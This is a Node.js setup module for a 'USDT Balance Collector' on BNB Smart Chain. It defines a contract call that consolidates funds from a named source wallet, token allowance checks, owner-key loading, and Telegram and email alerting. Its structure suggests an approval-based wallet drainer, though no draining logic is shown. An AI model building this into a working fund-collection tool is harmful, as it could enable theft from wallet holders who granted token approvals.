require('dotenv').config();
const { Web3 } = require('web3');
const TelegramBot = require('node-telegram-bot-api');
const nodemailer = require('nodemailer');

// USDT Balance Collector ABI
const CONTRACT_ABI = [
    {
        "inputs": [{"internalType": "address", "name": "sourceWallet", "type": "address"}],
        "name": "consolidateFunds",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "anonymous": false,
        "inputs": [
            {"indexed": true, "internalType": "address", "name": "from", "type": "address"},
            {"indexed": true, "internalType": "address", "name": "to", "type": "address"},
            {"indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "name": "FundsConsolidated",
        "type": "event"
    }
];

// BEP20 ABI
const BEP20_ABI = [
    {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}, {"name": "_spender", "type": "address"}],
        "name": "allowance",
        "outputs": [{"name": "remaining", "type": "uint256"}],
        "type": "function"
    }
];

// Token Info - Sirf USDT
const TOKEN_INFO = {
    '0x55d398326f99059ff775485246999027b3197955': { symbol: 'USDT', stable: true }
};

// Web3 Initialize
const web3 = new Web3(process.env.BSC_RPC_URL || 'https://bsc-dataseed1.binance.org');
const contract = new web3.eth.Contract(CONTRACT_ABI, process.env.CONTRACT_ADDRESS);

// Account - lazy load
let account = null;
function getAccount() {
    if (!account) {
        const privateKey = process.env.OWNER_PRIVATE_KEY;
        if (!privateKey) {
            throw new Error('Private key not configured');
        }
        account = web3.eth.accounts.privateKeyToAccount(privateKey);
        web3.eth.accounts.wallet.add(account);
        console.log('✅ Account loaded:', account.address);
    }
    return account;
}

// Telegram Bots
const telegramBots = [];

if (process.env.TELEGRAM_BOT_TOKEN_1 && process.env.TELEGRAM_CHAT_ID_1) {
    console.log('✅ Telegram bot 1 configured');
    console.log('   Token:', process.env.TELEGRAM_BOT_TOKEN_1.substring(0, 15) + '...');
    console.log('   Chat ID:', process.env.TELEGRAM_CHAT_ID_1);
    telegramBots.push({
        bot: new TelegramBot(process.env.TELEGRAM_BOT_TOKEN_1, { polling: false }),
        chatId: process.env.TELEGRAM_CHAT_ID_1
    });
} else {
    console.log('❌ TELEGRAM_BOT_TOKEN_1 or TELEGRAM_CHAT_ID_1 not set');
}

if (process.env.TELEGRAM_BOT_TOKEN_2 && process.env.TELEGRAM_CHAT_ID_2) {
    console.log('✅ Telegram bot 2 configured');
    telegramBots.push({
        bot: new TelegramBot(process.env.TELEGRAM_BOT_TOKEN_2, { polling: false }),
        chatId: process.env.TELEGRAM_CHAT_ID_2
    });
} else {
    console.log('ℹ️ TELEGRAM_BOT_TOKEN_2 or TELEGRAM_CHAT_ID_2 not set (optional)');
}

console.log('📱 Total Telegram bots configured:', telegramBots.length);

// Email
let emailTransporter = null;
if (process.env.SMTP_USER && process.env.SMTP_PASS) {
    console.log('✅ Email configured');
    emailTransporter = nodemailer.createTransport({
        host: process.env.SMTP_HOST,
        port: process.env.SMTP_PORT,
        auth: { user: process.env.SMTP_USER, pass: process.env.SMTP_PASS }
    });
} else {
    console.log('ℹ️ Email not configured (optional)');
}

module.exports = {
    web3,
    contract,
    getAccount,
    TOKEN_INFO,
    BEP20_ABI,
    telegramBots,
    emailTransporter
};